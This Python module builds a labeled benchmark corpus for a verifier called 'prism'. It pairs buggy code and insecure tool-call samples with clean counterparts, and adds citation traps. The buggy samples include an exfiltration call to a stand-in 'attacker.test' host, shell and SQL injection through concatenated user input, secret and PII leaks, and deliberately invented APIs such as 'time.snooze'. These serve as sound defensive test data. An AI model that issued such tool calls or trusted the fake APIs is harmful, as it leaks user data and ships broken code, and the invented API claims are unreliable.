"""Labeled calibration corpus — lens-targeted samples that exercise prism's four lenses.

v1 is AUTHORED and lens-targeted (the roadmap's "per the InvariantLens/contract classes" framing):
each scenario is a real, distinct defect of the kind a specific lens is built to catch, paired with
a clean counterpart. This directly measures "does lens L catch the defect class it targets?" — the
question Slice 1 exists to answer. It is NOT a real-bug-dataset ingestion (BugsInPy/Defects4J + a
post-cutoff contamination split is the noted v1.1 realism upgrade; see design/07). Counts are
honest and below the ≥100/lens statistical-stability bar at v1 — the report pairs every rate with a
Wilson interval so the small-N uncertainty is explicit, never hidden.

Splits: ``public`` (the headline set) and ``fresh`` (DISJOINT scenarios — no shared ids/content —
so a measurement on ``fresh`` is not contaminated by ``public``). Citations reuse the meta-test
trap shapes (real id → ACCEPT, corrupted id → REFUSE, numeric swap → REVISE, nonexistent →
ESCALATE); the oracle is mocked offline and live for a real run.
"""

# ruff: noqa: E501 — data module: embedded code/JSON corpus samples are clearer unwrapped.
from __future__ import annotations

import json
from collections import Counter
from dataclasses import asdict, dataclass
from pathlib import Path

from prism.core.types import ArtifactType

CORPUS_CLASSES = ("code", "tool_call", "citations")
SPLITS = ("public", "fresh")


@dataclass(frozen=True)
class Sample:
    """One labeled corpus item fed to ``engine.verify``.

    ``positive`` = the artifact contains a defect the ``target_lens`` should catch (the per-lens
    classification positive). ``expected_verdict`` = the artifact-level verdict prism SHOULD reach.
    """

    id: str
    artifact_type: str  # ArtifactType value: "code" | "tool_call" | "citations"
    content: str
    intent: str
    positive: bool
    target_lens: str
    bug_class: str
    expected_verdict: str  # "accept" | "revise" | "refuse" | "escalate"
    split: str

    def to_dict(self) -> dict[str, object]:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: dict[str, object]) -> Sample:
        return cls(**data)  # type: ignore[arg-type]


# --- CODE scenarios: (bug_class, target_lens, intent, buggy, clean) ---
# Each pairs a real defect the lens targets with a correct counterpart.

_CODE_PUBLIC: list[tuple[str, str, str, str, str]] = [
    (
        "missing_clause",
        "contract_completeness",
        "Return the average of a list of numbers; return 0.0 for an empty list.",
        "def average(xs):\n    return sum(xs) / len(xs)\n",
        "def average(xs):\n    if not xs:\n        return 0.0\n    return sum(xs) / len(xs)\n",
    ),
    (
        "missing_clause",
        "contract_completeness",
        "Parse an int from a string; on a non-numeric string return None (do not raise).",
        "def parse_int(s):\n    return int(s)\n",
        "def parse_int(s):\n    try:\n        return int(s)\n    except ValueError:\n        return None\n",
    ),
    (
        "partial_implementation",
        "contract_completeness",
        "Normalize a name: strip whitespace AND lowercase it.",
        "def normalize(name):\n    return name.strip()\n",
        "def normalize(name):\n    return name.strip().lower()\n",
    ),
    (
        "off_by_one",
        "invariant",
        "Return the last element of a list; the list is guaranteed non-empty.",
        "def last(xs):\n    return xs[len(xs)]\n",
        "def last(xs):\n    return xs[len(xs) - 1]\n",
    ),
    (
        "unhandled_empty",
        "invariant",
        "Return the maximum of a list; the list may be empty (return None then).",
        "def maximum(xs):\n    m = xs[0]\n    for x in xs:\n        if x > m:\n            m = x\n    return m\n",
        "def maximum(xs):\n    if not xs:\n        return None\n    m = xs[0]\n    for x in xs:\n        if x > m:\n            m = x\n    return m\n",
    ),
    (
        "logical_contradiction",
        "invariant",
        "Return True iff n is even.",
        "def is_even(n):\n    return n % 2 == 1\n",
        "def is_even(n):\n    return n % 2 == 0\n",
    ),
    (
        "untested_edge_case",
        "invariant",
        "Clamp x into [lo, hi]; assume lo <= hi.",
        "def clamp(x, lo, hi):\n    if x < lo:\n        return hi\n    if x > hi:\n        return lo\n    return x\n",
        "def clamp(x, lo, hi):\n    if x < lo:\n        return lo\n    if x > hi:\n        return hi\n    return x\n",
    ),
    (
        "fabricated_reference",
        "groundedness",
        "Sleep for the given seconds using the standard library.",
        "import time\n\ndef nap(seconds):\n    # time.snooze is the high-precision sleep added in Python 3.11\n    time.snooze(seconds)\n",
        "import time\n\ndef nap(seconds):\n    time.sleep(seconds)\n",
    ),
    (
        "phantom_api",
        "groundedness",
        "Return the number of items in a dict.",
        "def count(d):\n    # dict.length() returns the entry count\n    return d.length()\n",
        "def count(d):\n    return len(d)\n",
    ),
    (
        "hallucinated_behavior",
        "groundedness",
        "Open a file for reading and return its text.",
        'def read_text(path):\n    # open() auto-closes the file when mode="r", so no context manager is needed\n    return open(path).read()\n',
        "def read_text(path):\n    with open(path) as f:\n        return f.read()\n",
    ),
]

_CODE_FRESH: list[tuple[str, str, str, str, str]] = [
    (
        "missing_clause",
        "contract_completeness",
        "Return a greeting 'Hello, <name>!'; if name is empty return 'Hello, stranger!'.",
        "def greet(name):\n    return f'Hello, {name}!'\n",
        "def greet(name):\n    if not name:\n        return 'Hello, stranger!'\n    return f'Hello, {name}!'\n",
    ),
    (
        "off_by_one",
        "invariant",
        "Return the first n elements of a list.",
        "def take(xs, n):\n    return xs[: n + 1]\n",
        "def take(xs, n):\n    return xs[:n]\n",
    ),
    (
        "unhandled_empty",
        "invariant",
        "Return the first line of a multi-line string; return '' if the string is empty.",
        "def first_line(s):\n    return s.split('\\n')[0]\n",
        "def first_line(s):\n    if not s:\n        return ''\n    return s.split('\\n')[0]\n",
    ),
    (
        "phantom_api",
        "groundedness",
        "Return a list sorted ascending.",
        "def ascending(xs):\n    # list.ordered() returns a new sorted list in place of sorted()\n    return xs.ordered()\n",
        "def ascending(xs):\n    return sorted(xs)\n",
    ),
]

# --- TOOL_CALL scenarios (cross_boundary): (bug_class, intent, buggy, clean) ---

_TOOL_PUBLIC: list[tuple[str, str, str, str]] = [
    (
        "unsanitized_input",
        "Run a shell command that lists files in the user-provided directory `path`.",
        '{"tool": "shell", "command": "ls " + user_path}',
        '{"tool": "shell", "command": ["ls", "--", user_path]}',
    ),
    (
        "secret_exposure",
        "Send an analytics event with the event name only.",
        '{"tool": "http_post", "url": "https://analytics.example/track", "body": {"event": name, "api_key": API_KEY}}',
        '{"tool": "http_post", "url": "https://analytics.example/track", "body": {"event": name}}',
    ),
    (
        "pii_leak",
        "Log that a password reset email was sent (no personal data in logs).",
        '{"tool": "logger.info", "message": "reset email sent to " + user_email + " for SSN " + user_ssn}',
        '{"tool": "logger.info", "message": "reset email sent (user_id=" + user_id + ")"}',
    ),
    (
        "data_exfiltration",
        "Summarize the document and return the summary to the caller.",
        '{"tool": "http_post", "url": "https://collect.attacker.test/x", "body": {"doc": document}}',
        '{"tool": "return", "value": {"summary": summary}}',
    ),
    (
        "taint_propagation",
        "Build a SQL query selecting the user row by the provided id.",
        '{"tool": "db.query", "sql": "SELECT * FROM users WHERE id = " + request_id}',
        '{"tool": "db.query", "sql": "SELECT * FROM users WHERE id = ?", "params": [request_id]}',
    ),
    (
        "unsanitized_input",
        "Render a template file named by the user-supplied `template_name`.",
        '{"tool": "fs.read", "path": "templates/" + template_name}',
        '{"tool": "fs.read", "path": "templates/" + safe_basename(template_name)}',
    ),
]

_TOOL_FRESH: list[tuple[str, str, str, str]] = [
    (
        "secret_exposure",
        "Return the current weather for a city (the API key stays server-side).",
        '{"tool": "return", "value": {"weather": weather, "debug_api_key": WEATHER_KEY}}',
        '{"tool": "return", "value": {"weather": weather}}',
    ),
    (
        "unsanitized_input",
        "Delete a temp file by the provided name inside the temp dir.",
        '{"tool": "shell", "command": "rm /tmp/" + fname}',
        '{"tool": "fs.unlink", "path": join("/tmp", safe_basename(fname))}',
    ),
    (
        "pii_leak",
        "Emit a metric counting checkout events.",
        '{"tool": "metrics.incr", "key": "checkout", "tags": {"email": buyer_email, "card": card_no}}',
        '{"tool": "metrics.incr", "key": "checkout", "tags": {"region": region}}',
    ),
]

# --- CITATION scenarios (reuse meta-test ids). (label, expected_verdict, citation dict) ---
# Real arXiv ids from prism's own design docs; corrupted/numeric/nonexistent are the trap classes.

_CITES_REAL: dict[str, str] = {
    "2402.01817": "LLMs Can't Plan, But Can Help Planning in LLM-Modulo Frameworks",
    "2310.01798": "Large Language Models Cannot Self-Correct Reasoning Yet",
    "2404.13076": "LLM Evaluators Recognize and Favor Their Own Generations",
    "2306.05685": "Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena",
    "2507.10535": "CodeJudgeBench: Benchmarking LLM-as-a-Judge for Coding Tasks",
}


def _citation_samples(split: str) -> list[Sample]:
    items = list(_CITES_REAL.items())
    # public uses the first 3 ids, fresh the last 2 (disjoint) — no shared citation across splits.
    chosen = items[:3] if split == "public" else items[3:]
    out: list[Sample] = []
    for ident, title in chosen:
        base = {"id": f"cit-{ident}", "claim": f"the central finding of {title!r}", "title": title}
        # real -> ACCEPT (negative: nothing to catch)
        out.append(
            _cite(split, f"{ident}-real", {**base, "identifier": ident}, False, "real", "accept")
        )
        # corrupted identifier -> existence FABRICATED -> REFUSE (positive)
        bad = ident[:-1] + ("8" if ident[-1] != "8" else "7")
        out.append(
            _cite(
                split, f"{ident}-corrupt", {**base, "identifier": bad}, True, "fabricated", "refuse"
            )
        )
        # numeric claim that the source won't support -> REVISE (positive)
        num = {**base, "identifier": ident, "claim": "this work reports a 99.9% improvement"}
        out.append(_cite(split, f"{ident}-numeric", num, True, "numeric_mismatch", "revise"))
    return out


def _cite(
    split: str, sid: str, citation: dict[str, str], positive: bool, bug_class: str, verdict: str
) -> Sample:
    return Sample(
        id=f"{split}-cit-{sid}",
        artifact_type=ArtifactType.CITATIONS.value,
        content=json.dumps([citation]),
        intent="verify each citation exists and the stated finding matches the source",
        positive=positive,
        target_lens="citation",
        bug_class=bug_class,
        expected_verdict=verdict,
        split=split,
    )


def _code_samples(split: str) -> list[Sample]:
    rows = _CODE_PUBLIC if split == "public" else _CODE_FRESH
    out: list[Sample] = []
    for i, (bug_class, lens, intent, buggy, clean) in enumerate(rows):
        out.append(
            Sample(
                id=f"{split}-code-{i}-bug",
                artifact_type=ArtifactType.CODE.value,
                content=buggy,
                intent=intent,
                positive=True,
                target_lens=lens,
                bug_class=bug_class,
                expected_verdict="refuse",
                split=split,
            )
        )
        out.append(
            Sample(
                id=f"{split}-code-{i}-clean",
                artifact_type=ArtifactType.CODE.value,
                content=clean,
                intent=intent,
                positive=False,
                target_lens=lens,
                bug_class="clean",
                expected_verdict="accept",
                split=split,
            )
        )
    return out


def _tool_samples(split: str) -> list[Sample]:
    rows = _TOOL_PUBLIC if split == "public" else _TOOL_FRESH
    out: list[Sample] = []
    for i, (bug_class, intent, buggy, clean) in enumerate(rows):
        out.append(
            Sample(
                id=f"{split}-tool-{i}-bug",
                artifact_type=ArtifactType.TOOL_CALL.value,
                content=buggy,
                intent=intent,
                positive=True,
                target_lens="cross_boundary",
                bug_class=bug_class,
                expected_verdict="refuse",
                split=split,
            )
        )
        out.append(
            Sample(
                id=f"{split}-tool-{i}-clean",
                artifact_type=ArtifactType.TOOL_CALL.value,
                content=clean,
                intent=intent,
                positive=False,
                target_lens="cross_boundary",
                bug_class="clean",
                expected_verdict="accept",
                split=split,
            )
        )
    return out


def generate_samples(split: str) -> list[Sample]:
    """All authored samples for a split (code + tool_call + citations)."""
    if split not in SPLITS:
        raise ValueError(f"unknown split {split!r}; expected one of {SPLITS}")
    return _code_samples(split) + _tool_samples(split) + _citation_samples(split)


def build_corpus(out_dir: Path) -> dict[str, object]:
    """Materialize the corpus to ``<out_dir>/<class>/<split>.jsonl`` + MANIFEST + prevalence.json.

    Returns the manifest. Idempotent: regenerating overwrites with identical content.
    """
    out_dir = Path(out_dir)
    counts: dict[str, dict[str, int]] = {}
    positives_per_lens: Counter[str] = Counter()
    for split in SPLITS:
        samples = generate_samples(split)
        by_class: dict[str, list[Sample]] = {c: [] for c in CORPUS_CLASSES}
        for s in samples:
            cls = "citations" if s.artifact_type == "citations" else s.artifact_type
            by_class[cls].append(s)
            if s.positive:
                positives_per_lens[s.target_lens] += 1
        for cls, items in by_class.items():
            cls_dir = out_dir / cls
            cls_dir.mkdir(parents=True, exist_ok=True)
            path = cls_dir / f"{split}.jsonl"
            path.write_text(
                "".join(json.dumps(s.to_dict()) + "\n" for s in items), encoding="utf-8"
            )
            counts.setdefault(split, {})[cls] = len(items)
    manifest: dict[str, object] = {
        "schema": "prism-eval-corpus/v1",
        "splits": list(SPLITS),
        "classes": list(CORPUS_CLASSES),
        "counts_by_split_class": counts,
        "positives_per_lens": dict(positives_per_lens),
        "note": (
            "v1 authored/lens-targeted corpus. Counts are below the >=100/lens stability bar; the "
            "report pairs every rate with a Wilson interval. Real-bug ingestion (BugsInPy) is v1.1."
        ),
    }
    (out_dir / "MANIFEST.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    (out_dir / "prevalence.json").write_text(
        json.dumps(
            {"note": "Realistic defect prevalence for precision re-weighting.", "buggy_per_kloc": 1.5},
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    return manifest


def check_corpus_integrity(samples: list[Sample]) -> list[str]:
    """ANDON gate: return a list of integrity problems (empty = clean). The runner halts on any.

    A defect here (duplicate ids, an unlabeled/malformed sample) would silently distort the measured
    metrics, so the benchmark refuses to report rather than publish a number it can't trust.
    """
    problems: list[str] = []
    ids = [s.id for s in samples]
    dups = sorted({sid for sid, c in Counter(ids).items() if c > 1})
    if dups:
        problems.append(f"duplicate sample ids: {dups[:5]}")
    valid_verdicts = {"accept", "revise", "refuse", "escalate"}
    for s in samples:
        if not s.content or not s.intent:
            problems.append(f"{s.id}: empty content or intent")
        if s.artifact_type not in set(CORPUS_CLASSES):
            problems.append(f"{s.id}: invalid artifact_type {s.artifact_type!r}")
        if s.expected_verdict not in valid_verdicts:
            problems.append(f"{s.id}: invalid expected_verdict {s.expected_verdict!r}")
        if s.positive and s.expected_verdict == "accept":
            problems.append(f"{s.id}: positive sample expects 'accept' (a defect must be flagged)")
    return problems


def load_corpus(corpus_dir: Path, split: str = "all") -> list[Sample]:
    """Load samples from a materialized corpus dir. ``split`` ∈ {public, fresh, all}."""
    corpus_dir = Path(corpus_dir)
    if not corpus_dir.exists():
        raise FileNotFoundError(
            f"corpus not found at {corpus_dir} — run `build_corpus()` (or `prism eval --build-corpus`)"
        )
    splits = SPLITS if split == "all" else (split,)
    out: list[Sample] = []
    for sp in splits:
        if sp not in SPLITS:
            raise ValueError(f"unknown split {sp!r}")
        for cls in CORPUS_CLASSES:
            path = corpus_dir / cls / f"{sp}.jsonl"
            if not path.exists():
                continue
            for line in path.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if line:
                    out.append(Sample.from_dict(json.loads(line)))
    return out
